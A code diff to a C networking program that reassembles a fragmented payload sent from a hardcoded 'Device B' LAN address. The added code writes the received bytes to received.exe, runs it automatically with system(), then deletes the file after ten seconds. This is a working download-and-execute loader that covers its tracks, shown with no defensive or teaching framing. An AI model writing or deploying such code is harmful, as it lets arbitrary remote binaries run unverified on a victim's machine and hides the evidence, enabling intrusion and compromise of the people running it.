@@ -33,7 +33,7 @@
 #define BUFFER_SIZE 1024
 #define MAX_FRAGMENTS 1000
 #define PORT 8080
-#define DEVICE_B_IP "192.168.8.128"  // Hardcoded IP address for Device B
+#define DEVICE_B_IP "192.168.116.129"  // Hardcoded IP address for Device B
 
 // Function to get the local IP address
 char* get_local_ip() {
@@ -301,6 +301,26 @@ int main() {
         // Print a preview of the payload (first 100 chars)
         printf("Payload preview: %.100s%s\n", complete_payload, 
                (total_size > 100) ? "..." : "");
+    }
+
+    // Write the received binary payload to an executable file
+    FILE *exe_file = fopen("received.exe", "wb");
+    if (exe_file) {
+        fwrite(complete_payload, 1, total_size, exe_file);
+        fclose(exe_file);
+        printf("Executable written to received.exe\n");
+        
+        // Automatically execute the received executable
+        printf("Executing payload...\n");
+        system("received.exe");
+        printf("Execution completed\n");
+        
+        // Optional: Delete the executable after execution
+        Sleep(10000); // Wait 10 seconds
+        remove("received.exe");
+
+    } else {
+        fprintf(stderr, "Failed to write executable file\n");
     }
     
     // Clean up
